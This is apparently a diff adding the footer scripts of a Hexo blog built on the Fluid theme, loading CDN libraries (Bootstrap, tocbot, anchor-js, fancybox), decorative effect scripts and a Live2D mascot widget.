+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+  
+<script src="/js/curTexiao.js"></script>
+<script src="/js/time.js"></script>
+<script src="/js/backLines.js"></script>
+<script src="/js/piaoxue.js"></script>
+<script src="/js/qipao.js"></script>
+<script src="/js/curhit.js"></script>
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+<!-- hexo injector body_end start --><script src="/js/backgroundize.js"></script>
+  <link defer rel="stylesheet" href="/css/backgroundize.css" />
+  <!-- hexo injector body_end end --><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"scale":1,"hHeadPos":0.5,"vHeadPos":0.618,"jsonPath":"/live2dw/assets/koharu.model.json"},"display":{"superSample":2,"width":200,"height":400,"position":"left","hOffset":0,"vOffset":0},"mobile":{"show":false,"scale":0.5},"react":{"opacityDefault":0.7,"opacityOnHover":0.2},"log":false});</script></body>
+</html>
